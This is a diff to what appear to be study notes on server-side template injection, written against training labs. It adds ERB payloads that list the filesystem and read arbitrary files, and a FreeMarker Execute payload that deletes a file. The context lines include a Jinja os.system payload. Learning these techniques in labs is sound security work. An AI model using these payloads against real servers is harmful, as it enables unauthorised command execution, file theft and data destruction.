@@ -133,8 +133,8 @@ ${7*7}----->{{7*7}}---->{{7*'7'}}
 
 # If you are lucky the server will be printing the errors and you will be able to find the engine used inside the errors. Some possible payloads that may cause errors:
 
-${}
 {{}}
+${}
 <%= %>
 ${7/0}
 {{7/0}}
@@ -187,11 +187,20 @@ Payload: blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%
 
 
 
+                                ## Read about the security implications
+                                
+# In addition to providing the fundamentals of how to create and use templates, the documentation may also provide some sort of "Security" section.
+# The name of this section will vary, but it will usually outline all the potentially dangerous things that people should avoid doing with the template.
+# This can be an invaluable resource, even acting as a kind of cheat sheet for which behaviors you should look for during auditing, as well as how to exploit them. 
+
+<%= Dir.entries('/') %>
+<%= File.open('/example/arbitrary-file').read %>
 
 
 
 
-
+Lab: Server-side template injection using documentation
+Payload: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
 
 
 
